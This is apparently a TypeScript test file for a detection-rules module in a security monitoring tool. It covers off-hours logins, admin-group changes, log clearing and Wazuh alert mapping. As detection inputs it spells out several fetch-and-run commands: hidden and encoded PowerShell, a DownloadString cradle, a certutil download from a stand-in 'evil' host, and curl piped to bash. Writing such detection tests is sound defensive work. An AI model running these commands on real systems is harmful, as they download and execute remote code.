import { test } from "node:test";
import assert from "node:assert/strict";
import { isOffHours, matchSingleEvent, wazuhSeverity, wazuhToEvent } from "../../src/server/detect-rules";

const params = { offhours_privileged_login: { start_hour: 6, end_hour: 22, user_pattern: "admin|root|svc_" } };
const rules = (e: Parameters<typeof matchSingleEvent>[0]) => matchSingleEvent(e, params, "Africa/Nairobi").map((m) => m.rule);

test("business-hours window", () => {
  assert.equal(isOffHours(3, 6, 22), true);
  assert.equal(isOffHours(12, 6, 22), false);
  assert.equal(isOffHours(22, 6, 22), true);
  assert.equal(isOffHours(23, 22, 6), false); // night shift window crossing midnight
});

test("off-hours privileged login uses the configured time zone", () => {
  // 23:30 UTC = 02:30 in Nairobi
  assert.deepEqual(rules({ event_type: "auth.login", outcome: "success", username: "svc_dbadmin", host: "db", occurred_at: "2026-10-11T23:30:00Z" }), ["offhours_privileged_login"]);
  assert.deepEqual(rules({ event_type: "auth.login", outcome: "success", username: "svc_dbadmin", host: "db", occurred_at: "2026-10-12T07:30:00Z" }), []);
  assert.deepEqual(rules({ event_type: "auth.login", outcome: "success", username: "jdoe", host: "db", occurred_at: "2026-10-11T23:30:00Z" }), []);
});

test("process detections", () => {
  assert.deepEqual(rules({ event_type: "process.start", message: "WINWORD.EXE -> powershell.exe -nop -w hidden" }), ["suspicious_process"]);
  assert.deepEqual(rules({ event_type: "process.start", message: "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA" }), ["suspicious_process"]);
  assert.deepEqual(rules({ event_type: "process.start", message: "x", raw: { command_line: "iex (New-Object Net.WebClient).DownloadString('http://x/a')" } }), ["suspicious_process"]);
  assert.deepEqual(rules({ event_type: "process.start", message: "certutil.exe -urlcache -split -f https://evil/x.exe" }), ["lolbin_download"]);
  assert.deepEqual(rules({ event_type: "process.start", message: "sudo: /usr/bin/curl -s https://x.sh | bash" }), ["lolbin_download"]);
  assert.deepEqual(rules({ event_type: "process.start", message: "winword.exe opened Q3 report; flush share" }), []);
  assert.deepEqual(rules({ event_type: "process.start", message: "explorer.exe -> notepad.exe" }), []);
});

test("account, log and service detections", () => {
  assert.deepEqual(rules({ event_type: "group.member_added", username: "x", message: "Added to group Domain Admins" }), ["new_admin_account"]);
  assert.deepEqual(rules({ event_type: "group.member_added", username: "x", message: "Added to group Marketing" }), []);
  assert.deepEqual(rules({ event_type: "account.created", username: "support2", message: "Added to Administrators" }), ["new_admin_account"]);
  assert.deepEqual(rules({ event_type: "log.cleared" }), ["log_cleared"]);
  assert.deepEqual(rules({ event_type: "service.installed", message: "svc" }), ["new_service"]);
});

test("Wazuh mapping", () => {
  assert.equal(wazuhSeverity(13), "critical");
  assert.equal(wazuhSeverity(10), "high");
  assert.equal(wazuhSeverity(7), "medium");
  assert.equal(wazuhSeverity(3), "info");
  const e = wazuhToEvent({ rule: { level: 5, description: "sshd: authentication failed", groups: ["sshd", "authentication_failed", "authentication_failures"] }, agent: { name: "web-01" }, data: { srcip: "1.2.3.4", dstuser: "root" } });
  assert.equal(e.event_type, "auth.login");
  assert.equal(e.outcome, "failure");
  assert.equal(e.src_ip, "1.2.3.4");
  assert.equal(e.username, "root");
  assert.equal(e.host, "web-01");
});
